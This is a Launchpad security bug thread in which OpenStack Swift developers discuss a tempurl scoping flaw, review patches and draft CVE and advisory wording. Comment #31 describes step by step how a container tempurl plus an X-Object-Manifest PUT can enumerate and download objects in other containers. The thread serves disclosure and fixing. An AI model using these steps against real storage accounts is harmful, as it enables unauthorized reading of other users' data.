1) Prevent tempurl PUTs from writing DLOs (by returning an error if x-object-manifest header is on the request).
2) The tempurl should tract the scope of the signed url (ie account and container) so that it cannot cross boundaries. In other words, the subrequests generated eg to fetch DLO segments should be authorized according to the original tempurl (not with a blanket "allow" authorize() callback).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-04-29: |  |  | [#19](/swift/%2Bbug/1449212/comments/19) |
| --- | --- | --- | --- |

If your going to give out a PUT tempurl then your trusting someone to put stuff. But I guess there are different levels of \_trust\_.

I see that DLO's are an issue in this case, (someone could attempt to probe the account) and so if we go with blocking a PUT request from the tempurl middleware when X-Object-Manifiest headers exists will stop that. Noting we want a tempurl GET to support DLO as that is a valid use case.

If we are going to filter on X-Object-Manifest in tempurl PUT, do we need to think about x-versions-location as well (which I guess isn't a problem until someone has PUT and DELETE tempurls)... However, will this start making TempURL middleware more coupled with others? I guess if we can find a good way to limit the scope tempurl's have access to will solve this.

If your going to give out a PUT tempurl then your trusting someone to put stuff. But I guess there are different levels of \_trust\_.
I see that DLO's are an issue in this case, (someone could attempt to probe the account) and so if we go with blocking a PUT request from the tempurl middleware when X-Object-Manifiest headers exists will stop that. Noting we want a tempurl GET to support DLO as that is a valid use case.
If we are going to filter on X-Object-Manifest in tempurl PUT, do we need to think about x-versions-location as well (which I guess isn't a problem until someone has PUT and DELETE tempurls)... However, will this start making TempURL middleware more coupled with others? I guess if we can find a good way to limit the scope tempurl's have access to will solve this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-04-29: |  |  | [#20](/swift/%2Bbug/1449212/comments/20) |
| --- | --- | --- | --- |

There are different levels of trust, but I think what is at issue here is the account owner's expectation of what a user can do with a temp url he gives out. To me, the issue revolves around users being able to use these things to get information that is not obvious to the account owner. If it is obvious, then the feature might become useless as it is trivial to gain access to objects that you should not have access to or to probe for the existence of objects.

I don't see an issue with x-versions-location, as you can not set headers on a container with a temp url as far as I know. So it does not seem like it could be abused to either leak data or probe for object existence. Even if you have a PUT and DELETE temp url, and the container has the x-versions-location set, all you would be able to do is push and pop versions of the object you have access to into and out of the x-versions-location container. And that seems like it might be expected behavior by the account owner. (although there might be other ways to abuse it which I can't think of right now)

There are different levels of trust, but I think what is at issue here is the account owner's expectation of what a user can do with a temp url he gives out. To me, the issue revolves around users being able to use these things to get information that is not obvious to the account owner. If it is obvious, then the feature might become useless as it is trivial to gain access to objects that you should not have access to or to probe for the existence of objects.
I don't see an issue with x-versions-location, as you can not set headers on a container with a temp url as far as I know. So it does not seem like it could be abused to either leak data or probe for object existence. Even if you have a PUT and DELETE temp url, and the container has the x-versions-location set, all you would be able to do is push and pop versions of the object you have access to into and out of the x-versions-location container. And that seems like it might be expected behavior by the account owner. (although there might be other ways to abuse it which I can't think of right now)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-04-29: |  |  | [#21](/swift/%2Bbug/1449212/comments/21) |
| --- | --- | --- | --- |

ahh, good call Richard. (X-Versions-Location).

ahh, good call Richard. (X-Versions-Location).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-01: |  |  | [#22](/swift/%2Bbug/1449212/comments/22) |
| --- | --- | --- | --- |

* [container-tempurl-scoping.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4388691/%2Bfiles/container-tempurl-scoping.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4388691)
  (82.1 KiB,
  text/plain)

Here's a potential patch. It looks large, but it's mostly unit-test fallout.

It's the output of `git show` on a local branch of mine, so it's got a commit comment that goes into a fair amount of detail.

Here's a potential patch. It looks large, but it's mostly unit-test fallout.
It's the output of `git show` on a local branch of mine, so it's got a commit comment that goes into a fair amount of detail.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-01: |  |  | [#23](/swift/%2Bbug/1449212/comments/23) |
| --- | --- | --- | --- |

so I think the mostly unit-test fallout is going to be an issue for back-porting. The commit message is great, but it doesn't really go into detail about why moving the env cache to the subdir was required.

I think I understand now that in creating a copy of the subrequest before sending it down into the app the cached values weren't getting set on the req that originally came \*into\* the app - which caused some things to go south because of how crazy all that env caching get\_info stuff is. Probably should be fixed - but not 100% sure it needs to be part of this fix and backport? Honestly the whole copy trick seems like a lot of effort to go through to avoid the swift.authorize pop? Why can't we just do like what we do with cross-account-copy requests and just leave the authorize callback in place?

<https://gist.github.com/clayg/11e4e9c0c3f652d82e0f>

^ this mostly just steals sam's hardwork and tries to avoid the info cache change that caused all the test fallout.

Also I'm not 100% sure on the precedence of container and account tempurl keys? Maybe it was pre-existing but I don't think it had the same effect. Now if a tempurl matches the container key it'll get scoped - but if that key happens to collide with the account my cross container segment object downloads don't authorize - and there's nothing really to tell me whats going on? Would it be better to scope to the larger matching scope?

Also, I think we need functests to cover this issue.

Also, isn't there a separate issue with handing out a PUT tempurl that we need to address with stripping manifest headers - or did I miss where we decided that's a non-issue?

so I think the mostly unit-test fallout is going to be an issue for back-porting. The commit message is great, but it doesn't really go into detail about why moving the env cache to the subdir was required.
I think I understand now that in creating a copy of the subrequest before sending it down into the app the cached values weren't getting set on the req that originally came \*into\* the app - which caused some things to go south because of how crazy all that env caching get\_info stuff is. Probably should be fixed - but not 100% sure it needs to be part of this fix and backport? Honestly the whole copy trick seems like a lot of effort to go through to avoid the swift.authorize pop? Why can't we just do like what we do with cross-account-copy requests and just leave the authorize callback in place?
https://gist.github.com/clayg/11e4e9c0c3f652d82e0f
^ this mostly just steals sam's hardwork and tries to avoid the info cache change that caused all the test fallout.
Also I'm not 100% sure on the precedence of container and account tempurl keys? Maybe it was pre-existing but I don't think it had the same effect. Now if a tempurl matches the container key it'll get scoped - but if that key happens to collide with the account my cross container segment object downloads don't authorize - and there's nothing really to tell me whats going on? Would it be better to scope to the larger matching scope?
Also, I think we need functests to cover this issue.
Also, isn't there a separate issue with handing out a PUT tempurl that we need to address with stripping manifest headers - or did I miss where we decided that's a non-issue?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-04: |  |  | [#24](/swift/%2Bbug/1449212/comments/24) |
| --- | --- | --- | --- |

Going in no particular order:

If an account and container share a key, then the bigger scope should apply. That'll cause the minimum confusion. I'll fix it.

I will also put more words about the swift.infocache thing in the commit message.

I will attempt to write a functional test as well.

We don't need to strip anything on tempurl PUT. Now that the authorize callback isn't getting stepped on, you can't use a container tempurl to GET a manifest with segments in another container, so there's no problem letting the user make one.

I'd like to, someday, make all that get\_info stuff a little more sane. The fact that it relies on this key existing in the response's environment dictionary to get account or container info is pretty damn strange, and it causes all sorts of problems if you ever want to use a modified response without changing what the caller sent you. This fix makes it a little better in that you can shallow-copy the WSGI environment without breaking get\_info()'s caching and basic functionality. The real fix is probably to make get\_info() look at the response headers for account/container info instead of grubbing around in the response environment.

I'm not a fan of adding to the COPY-check for a couple reasons. First, swift.authorize\_override is really just an instruction to auth systems that says someone else is stepping in to handle auth so please don't fail this request. Overloading that in the proxy seems like a hack that works for tempurl, but only coincidentally. Second, since Thiago is working on moving COPY to middleware, we'll be able to get rid of that workaround for COPY too, and just always pop out swift.authorize if it has already authorized the request.

Besides, moving all that stuff to swift.infocache can help out the cacheability of stuff. Right now, if a middleware makes a subrequest and shallow-copies the environment to do so, any get\_\*\_info done on that subrequest doesn't get cached later since it only appears in the copied env. By moving all that stuff into swift.infocache, the get\_\*\_info calls will get their results cached.

Going in no particular order:
If an account and container share a key, then the bigger scope should apply. That'll cause the minimum confusion. I'll fix it.
I will also put more words about the swift.infocache thing in the commit message.
I will attempt to write a functional test as well.
We don't need to strip anything on tempurl PUT. Now that the authorize callback isn't getting stepped on, you can't use a container tempurl to GET a manifest with segments in another container, so there's no problem letting the user make one.
I'd like to, someday, make all that get\_info stuff a little more sane. The fact that it relies on this key existing in the response's environment dictionary to get account or container info is pretty damn strange, and it causes all sorts of problems if you ever want to use a modified response without changing what the caller sent you. This fix makes it a little better in that you can shallow-copy the WSGI environment without breaking get\_info()'s caching and basic functionality. The real fix is probably to make get\_info() look at the response headers for account/container info instead of grubbing around in the response environment.
I'm not a fan of adding to the COPY-check for a couple reasons. First, swift.authorize\_override is really just an instruction to auth systems that says someone else is stepping in to handle auth so please don't fail this request. Overloading that in the proxy seems like a hack that works for tempurl, but only coincidentally. Second, since Thiago is working on moving COPY to middleware, we'll be able to get rid of that workaround for COPY too, and just always pop out swift.authorize if it has already authorized the request.
Besides, moving all that stuff to swift.infocache can help out the cacheability of stuff. Right now, if a middleware makes a subrequest and shallow-copies the environment to do so, any get\_\*\_info done on that subrequest doesn't get cached later since it only appears in the copied env. By moving all that stuff into swift.infocache, the get\_\*\_info calls will get their results cached.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-04: |  |  | [#25](/swift/%2Bbug/1449212/comments/25) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch2.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4390909/%2Bfiles/tempurl-torgomatic-patch2.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4390909)
  (86.4 KiB,
  text/plain)

This one includes a better explanation in the commit comment, a pair of functional tests for DLO + container tempurl, and a test that account-scope beats container-scope when they share a key (turns out that was already the case, but still good to test for).

This one includes a better explanation in the commit comment, a pair of functional tests for DLO + container tempurl, and a test that account-scope beats container-scope when they share a key (turns out that was already the case, but still good to test for).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-05: |  |  | [#26](/swift/%2Bbug/1449212/comments/26) |
| --- | --- | --- | --- |

Here's a first take at an impact description for this. I've almost certainly got some of the details and terminology wrong, so please correct me. It looks from the latest updates like any potential to exploit account tempurls in a similar fashion has been discounted, and so this is a kilo (2.3.0) only vulnerability since container tempurls were implemented after Juno/2.2.0 (and also after the 2.2.2 interim release)...

Title: Information leak via Swift container tempurls

Reporter: Richard Hawkins from Rackspace

Products: Swift

Affects: 2.3.0

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl generated using a key on a Swift container, a malicious actor may retrieve objects within any other container for the same tenant environment.

Here's a first take at an impact description for this. I've almost certainly got some of the details and terminology wrong, so please correct me. It looks from the latest updates like any potential to exploit account tempurls in a similar fashion has been discounted, and so this is a kilo (2.3.0) only vulnerability since container tempurls were implemented after Juno/2.2.0 (and also after the 2.2.2 interim release)...
Title: Information leak via Swift container tempurls
Reporter: Richard Hawkins from Rackspace
Products: Swift
Affects: 2.3.0
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl generated using a key on a Swift container, a malicious actor may retrieve objects within any other container for the same tenant environment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-05-05: |  |  | [#27](/swift/%2Bbug/1449212/comments/27) |
| --- | --- | --- | --- |

Hi Jeremy,

I think in addition, the discussions that resulted in me reporting this bug exposed a second vulnerability with account level temp URLs that has been around for a while.

Where someone with a account level PUT temp URL could potentially probe for existing objects by created DLO that references other containers/objects and HEADING the DLO created. If they had a pair of account level PUT/GET temp URLs, could additionally retrieve data from any object found.

I am not sure who first figured it out, but Sam Merritt was I think the first person to explain it such that I understood this aspect of it.

Hi Jeremy,
I think in addition, the discussions that resulted in me reporting this bug exposed a second vulnerability with account level temp URLs that has been around for a while.
Where someone with a account level PUT temp URL could potentially probe for existing objects by created DLO that references other containers/objects and HEADING the DLO created. If they had a pair of account level PUT/GET temp URLs, could additionally retrieve data from any object found.
I am not sure who first figured it out, but Sam Merritt was I think the first person to explain it such that I understood this aspect of it.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-05-05

| Changed in ossa: | |
| --- | --- |
| **status**: | Incomplete → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-05: |  |  | [#28](/swift/%2Bbug/1449212/comments/28) |
| --- | --- | --- | --- |

Richard: Thanks. I guess I'm just confused where Samuel's commit message says "A similar bug would exist for manifests referencing other accounts except that neither the X-Object-Manifest (DLO) nor the JSON manifest document (SLO) have a way of specifying a different account." I took this to mean that only container tempurls are at issue and account tempurls are not, but it may be that my shallow understanding of the topic is biting me here.

If account tempurls are in fact also a problem, as previously discussed, then this sounds like it also affects versions through 1.13.1 (Icehouse), and 2.0.0 through 2.2.0 (Juno), as well as 2.2.1 through 2.3.0 (Kilo). If so, I think the impact description would look more like...

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins from Rackspace

Products: Swift

Affects: versions through 1.13.1, 2.0.0 through 2.2.0, 2.2.1 through 2.3.0

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl generated using a key on a Swift container or account, a malicious actor may retrieve objects within any other container for the same tenant environment.

Richard: Thanks. I guess I'm just confused where Samuel's commit message says "A similar bug would exist for manifests referencing other accounts except that neither the X-Object-Manifest (DLO) nor the JSON manifest document (SLO) have a way of specifying a different account." I took this to mean that only container tempurls are at issue and account tempurls are not, but it may be that my shallow understanding of the topic is biting me here.
If account tempurls are in fact also a problem, as previously discussed, then this sounds like it also affects versions through 1.13.1 (Icehouse), and 2.0.0 through 2.2.0 (Juno), as well as 2.2.1 through 2.3.0 (Kilo). If so, I think the impact description would look more like...
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins from Rackspace
Products: Swift
Affects: versions through 1.13.1, 2.0.0 through 2.2.0, 2.2.1 through 2.3.0
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl generated using a key on a Swift container or account, a malicious actor may retrieve objects within any other container for the same tenant environment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-05: |  |  | [#29](/swift/%2Bbug/1449212/comments/29) |
| --- | --- | --- | --- |

Jeremy: you are correct; container tempurls have a problem, but account-level do not.

Jeremy: you are correct; container tempurls have a problem, but account-level do not.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-05: |  |  | [#30](/swift/%2Bbug/1449212/comments/30) |
| --- | --- | --- | --- |

Thanks Samuel! In that case, soliciting further comments on my original impact description from comment #26... is what's there correct? Any additional details we should include with the private CVE request?

Thanks Samuel! In that case, soliciting further comments on my original impact description from comment #26... is what's there correct? Any additional details we should include with the private CVE request?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-05: |  |  | [#31](/swift/%2Bbug/1449212/comments/31) |
| --- | --- | --- | --- |

You need more than one tempurl to actually retrieve objects. Maybe this?

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other container for the same Swift account (tenant) environment.

------

There are two related ways to exploit this:

The first way: given a tempurl for an object generated using a key on that object's container, one can PUT a manifest (i.e. object with X-Object-Manifest) to that URL, then HEAD the new object and, by observing the Etag and Content-Length contained within the HEAD response, learn whether an object starting with the given prefix exists.

For example, given two containers "red" and "blue" and a PUT tempurl for /v1/a/red/manifest, one can PUT /v1/a/red/manifest with header "X-Object-Manifest: /blue/abcd". A subsequent HEAD request for /v1/a/red/manifest will receive a response with an Etag and a Content-Length; the Etag is the MD5 hash of the Etags of all objects matching /v1/a/blue/abcd\*, and the Content-Length is the sum of their lengths. If the Etag is "d41d8cd98f00b204e9800998ecf8427e" (the MD5 of the empty string), then there are no objects whose names match /v1/a/blue/abcd\*. One can then overwrite the manifest with another that has a different X-Object-Manifest value, and in this way, can learn the names, lengths, and Etags of every object in container "blue".

The second way: given a tempurl \*key\* for a container, you can construct a PUT tempurl and a GET tempurl for the same object. Then, using the same procedure as above, discover the name of an object in the "blue" container. Then, PUT a manifest with "X-Object-Manifest: /blue/other-object-name", and finally, use the GET tempurl to download /v1/a/blue/other-object-name.

Both these exploits rely on large-object GET requests being able to examine segments outside the manifest's container even though the request was signed with a container-level tempurl key.

You need more than one tempurl to actually retrieve objects. Maybe this?
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other container for the same Swift account (tenant) environment.
------
There are two related ways to exploit this:
The first way: given a tempurl for an object generated using a key on that object's container, one can PUT a manifest (i.e. object with X-Object-Manifest) to that URL, then HEAD the new object and, by observing the Etag and Content-Length contained within the HEAD response, learn whether an object starting with the given prefix exists.
For example, given two containers "red" and "blue" and a PUT tempurl for /v1/a/red/manifest, one can PUT /v1/a/red/manifest with header "X-Object-Manifest: /blue/abcd". A subsequent HEAD request for /v1/a/red/manifest will receive a response with an Etag and a Content-Length; the Etag is the MD5 hash of the Etags of all objects matching /v1/a/blue/abcd\*, and the Content-Length is the sum of their lengths. If the Etag is "d41d8cd98f00b204e9800998ecf8427e" (the MD5 of the empty string), then there are no objects whose names match /v1/a/blue/abcd\*. One can then overwrite the manifest with another that has a different X-Object-Manifest value, and in this way, can learn the names, lengths, and Etags of every object in container "blue".
The second way: given a tempurl \*key\* for a container, you can construct a PUT tempurl and a GET tempurl for the same object. Then, using the same procedure as above, discover the name of an object in the "blue" container. Then, PUT a manifest with "X-Object-Manifest: /blue/other-object-name", and finally, use the GET tempurl to download /v1/a/blue/other-object-name.
Both these exploits rely on large-object GET requests being able to examine segments outside the manifest's container even though the request was signed with a container-level tempurl key.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-06: |  |  | [#32](/swift/%2Bbug/1449212/comments/32) |
| --- | --- | --- | --- |

Jeremy, Richard, Sam

Would anyone be against opening a separate security issue for the older "account level PUT temp-url allows probing for object existence via DLO's" issue?

I have a functest that will demonstrate the issue - we could try the remove headers trick and decide if that's how we want to address it - I don't think it will effect this patch except that it will only work with account-level temp-url keys once we approve this change.

Jeremy, Richard, Sam
Would anyone be against opening a separate security issue for the older "account level PUT temp-url allows probing for object existence via DLO's" issue?
I have a functest that will demonstrate the issue - we could try the remove headers trick and decide if that's how we want to address it - I don't think it will effect this patch except that it will only work with account-level temp-url keys once we approve this change.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-05-06: |  |  | [#33](/swift/%2Bbug/1449212/comments/33) |
| --- | --- | --- | --- |

Clay: I would not be against it. Being able to probe and possibly retrieve data, even if it is only with an account level temp URL, kinda scares me.

Clay: I would not be against it. Being able to probe and possibly retrieve data, even if it is only with an account level temp URL, kinda scares me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-06: |  |  | [#34](/swift/%2Bbug/1449212/comments/34) |
| --- | --- | --- | --- |

Samuel: Thanks for the additional details. As far as the CVE request goes, we simply need enough detail to reasonably differentiate this vulnerability from similar potential vulnerabilities which might be discovered in Swift over a relatively short period of time (say a year, as CVEs are year-scoped based on their discovery dates). For a deeper dive into more specific facets of the vulnerability the eventual security advisory will link to the bug and the patch(es) fixing it, so we don't need to get particularly verbose in the impact description as long as the risks and any \_commonly\_occurring\_ mitigating factors are mentioned.

Samuel: Thanks for the additional details. As far as the CVE request goes, we simply need enough detail to reasonably differentiate this vulnerability from similar potential vulnerabilities which might be discovered in Swift over a relatively short period of time (say a year, as CVEs are year-scoped based on their discovery dates). For a deeper dive into more specific facets of the vulnerability the eventual security advisory will link to the bug and the patch(es) fixing it, so we don't need to get particularly verbose in the impact description as long as the risks and any \_commonly\_occurring\_ mitigating factors are mentioned.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-06: |  |  | [#35](/swift/%2Bbug/1449212/comments/35) |
| --- | --- | --- | --- |

Clay: If we open an additional bug for a related issue, unless it's disclosed before or at the same time as this one, the publication of this bug will lay that one bare. We would either want a simultaneous publication/advisory/fix for both bugs, or we'd need to create two new bugs to separate the issues into and keep this original bug private until both new bugs have been disclosed.

Clay: If we open an additional bug for a related issue, unless it's disclosed before or at the same time as this one, the publication of this bug will lay that one bare. We would either want a simultaneous publication/advisory/fix for both bugs, or we'd need to create two new bugs to separate the issues into and keep this original bug private until both new bugs have been disclosed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-06: |  |  | [#36](/swift/%2Bbug/1449212/comments/36) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/36/%2Bdownload) (3.4 KiB)

Jeremy: OK, well I like the idea mainly because the dlo-manifest-with-put-temp-url-to-probe-other-containers issue will require back-ports to older releases while the container-temp-url-key scoping just needs to go back to kilo.

If we can co-ordinate the disclosure date for both it seems manageable. You said you're not against it right?

Unless someone beats me to it - or argues against it - I'll make a separate private security bug for the use dlo-manifest-with-put-temp-url-to-probe-other-containers issue and add my functional test that will describe the issue.

But I sorta wondering, if you can't PUT SLO manifests with tempurls (because of the questionable query-arg stripping) and we decide to strip DLO headers on PUT tempurls to address the account-tempurl issue - does the container scoping issue close itself - or are we still worried about a compromised app that has write access to a container and the ability to create pre-authed GET requests with a container-temp-url key creating a manifest they wouldn't normally authorize to cross-container read? Still seems like a reasonable vector to close with tempurl scoping...

Although we need to make sure we have good docs describing the limitations of container-tempurls and segmented objects - since I think we fully plan to support account-tempurls for manifests whose segments are in another container and we're explicitly deciding that if you have a valid cross-container SLO in a container and you try to create a container-tempurl for it - it doesn't work - on purpose.

FWIW, I think sam's swift.info patch is fine, the functests look good, I think sending a copy of the request with the swift.authorized popped into the app preserves existing behavior and expectations pretty well. I was worried about backports of the test fallout from that patch - but since we'd only backport it to Kilo I think it's fine - +2.

However, I still feel like it's conflating all of our grief with the get\_info caching and this security issue - which I'm sure we want to be as surgical of a fix as possible. I'm ok with going the route sam has suggested (+2), but still wondering if there might be something we like better for this fix... asides from the "don't pop authorize if it's a override authorize" trick I already suggested - another way to fake out the authorize pop would be to have the scoped authorized callbacks return an 403 unless the acls have been populated on the request so you make sure you're responding None to the delay denial callback and the not the early check. Or only pop authorized if swift.owner has been populated into the environment would work, since the whole pop trick is just an optimization anyway. OTOH, both of those are hacks, not modifying the request that was handed into the app seems like a reasonable and desireable behavior. Using a copy of the request to pull the authorize callback out of seems like a reasonable way to do that (don't modify the original request) but also still support the weird double auth check delay denial thing where we call authorize twice, ignore the denied response, but on None try to avoid calling authorize again after acl's have been fetched since the author...

[Read more...](/swift/%2Bbug/1449212/comments/36)

Jeremy: OK, well I like the idea mainly because the dlo-manifest-with-put-temp-url-to-probe-other-containers issue will require back-ports to older releases while the container-temp-url-key scoping just needs to go back to kilo.
If we can co-ordinate the disclosure date for both it seems manageable. You said you're not against it right?
Unless someone beats me to it - or argues against it - I'll make a separate private security bug for the use dlo-manifest-with-put-temp-url-to-probe-other-containers issue and add my functional test that will describe the issue.
But I sorta wondering, if you can't PUT SLO manifests with tempurls (because of the questionable query-arg stripping) and we decide to strip DLO headers on PUT tempurls to address the account-tempurl issue - does the container scoping issue close itself - or are we still worried about a compromised app that has write access to a container and the ability to create pre-authed GET requests with a container-temp-url key creating a manifest they wouldn't normally authorize to cross-container read? Still seems like a reasonable vector to close with tempurl scoping...
Although we need to make sure we have good docs describing the limitations of container-tempurls and segmented objects - since I think we fully plan to support account-tempurls for manifests whose segments are in another container and we're explicitly deciding that if you have a valid cross-container SLO in a container and you try to create a container-tempurl for it - it doesn't work - on purpose.
FWIW, I think sam's swift.info patch is fine, the functests look good, I think sending a copy of the request with the swift.authorized popped into the app preserves existing behavior and expectations pretty well. I was worried about backports of the test fallout from that patch - but since we'd only backport it to Kilo I think it's fine - +2.
However, I still feel like it's conflating all of our grief with the get\_info caching and this security issue - which I'm sure we want to be as surgical of a fix as possible. I'm ok with going the route sam has suggested (+2), but still wondering if there might be something we like better for this fix... asides from the "don't pop authorize if it's a override authorize" trick I already suggested - another way to fake out the authorize pop would be to have the scoped authorized callbacks return an 403 unless the acls have been populated on the request so you make sure you're responding None to the delay denial callback and the not the early check. Or only pop authorized if swift.owner has been populated into the environment would work, since the whole pop trick is just an optimization anyway. OTOH, both of those are hacks, not modifying the request that was handed into the app seems like a reasonable and desireable behavior. Using a copy of the request to pull the authorize callback out of seems like a reasonable way to do that (don't modify the original request) but also still support the weird double auth check delay denial thing where we call authorize twice, ignore the denied response, but on None try to avoid calling authorize again after acl's have been fetched since the authorize callback was already able to authorize the request without them originally. Has anyone else looked at sam's patch - did the commit message update help grok the swift.info cache trick which enables the use of the copied request instead of modifying the original? Does that look good to folks?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-05-10: |  |  | [#37](/swift/%2Bbug/1449212/comments/37) |
| --- | --- | --- | --- |

Sam: Sorry it took so long.

The only thing I found was really minor, and probably not worth holding back the patch since it's only a doc string and could be improved at a later time. So I will give my +1 for the patch, but maybe consider the following:

In swift/common/middleware/tempurl.py

I think the example return value for \_get\_keys was a little confusing due to missing ')' for \*-Key-2 examples.

~ 471 :returns: [

~ 472 (X-Account-Meta-Temp-URL-Key str value, ACCOUNT\_SCOPE) if set,

~ 473 (X-Account-Meta-Temp-URL-Key-2 str value, ACCOUNT\_SCOPE if set,

+ 474 (X-Container-Meta-Temp-URL-Key str value, CONTAINER\_SCOPE) if set,

+ 475 (X-Container-Meta-Temp-URL-Key-2 str value, CONTAINER\_SCOPE if set,

+ 476 ]

Something like the following might be a little clearer IMO:

~ 471 :returns: List of tuples for each key set. Where the tuple

~ 472 consists of the str value of \*-Meta-Temp-Url-Key and

~ 473 the scope of the key.

+ 474 Example: [

+ 475 (X-Account-Meta-Temp-URL-Key value, ACCOUNT\_SCOPE),

+ 476 (X-Account-Meta-Temp-URL-Key-2 value, ACCOUNT\_SCOPE),

+ 477 (X-Container-Meta-Temp-URL-Key value, CONTAINER\_SCOPE),

+ 478 (X-Container-Meta-Temp-URL-Key-2 value, CONTAINER\_SCOPE),

+ 479 ]

Sam: Sorry it took so long.
The only thing I found was really minor, and probably not worth holding back the patch since it's only a doc string and could be improved at a later time. So I will give my +1 for the patch, but maybe consider the following:
In swift/common/middleware/tempurl.py
I think the example return value for \_get\_keys was a little confusing due to missing ')' for \*-Key-2 examples.
~ 471 :returns: [
~ 472 (X-Account-Meta-Temp-URL-Key str value, ACCOUNT\_SCOPE) if set,
~ 473 (X-Account-Meta-Temp-URL-Key-2 str value, ACCOUNT\_SCOPE if set,
+ 474 (X-Container-Meta-Temp-URL-Key str value, CONTAINER\_SCOPE) if set,
+ 475 (X-Container-Meta-Temp-URL-Key-2 str value, CONTAINER\_SCOPE if set,
+ 476 ]
Something like the following might be a little clearer IMO:
~ 471 :returns: List of tuples for each key set. Where the tuple
~ 472 consists of the str value of \*-Meta-Temp-Url-Key and
~ 473 the scope of the key.
+ 474 Example: [
+ 475 (X-Account-Meta-Temp-URL-Key value, ACCOUNT\_SCOPE),
+ 476 (X-Account-Meta-Temp-URL-Key-2 value, ACCOUNT\_SCOPE),
+ 477 (X-Container-Meta-Temp-URL-Key value, CONTAINER\_SCOPE),
+ 478 (X-Container-Meta-Temp-URL-Key-2 value, CONTAINER\_SCOPE),
+ 479 ]

[Thierry Carrez (ttx)](https://launchpad.net/~ttx)
on 2015-05-11

| Changed in ossa: | |
| --- | --- |
| **importance**: | Undecided → Medium |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-05-11: |  |  | [#38](/swift/%2Bbug/1449212/comments/38) |
| --- | --- | --- | --- |

Hi, so trying to understand the issue here:

A/ Since Kilo, container temp url allows probing and reading other containers' objects within the same account,

B/ Since at least Icehouse, account temp url allows probing and reading containers' objects within different accounts.

Correct me if I'm wrong, but the underlying issue seems identical (lack of check for temp url), and thus we better issue a single advisory (that could cover two bugs reports and different patch sets).

Some questions:

Comment #31 suggests the exploit needs more than one temp url. Is this for the account temp url issue ?

The current proposed fix in comment #25 only fix the container temp url and does not require a backport right ?

So what we are missing here to move forward is a fix for account temp url to be backported up to icehouse.

Hi, so trying to understand the issue here:
A/ Since Kilo, container temp url allows probing and reading other containers' objects within the same account,
B/ Since at least Icehouse, account temp url allows probing and reading containers' objects within different accounts.
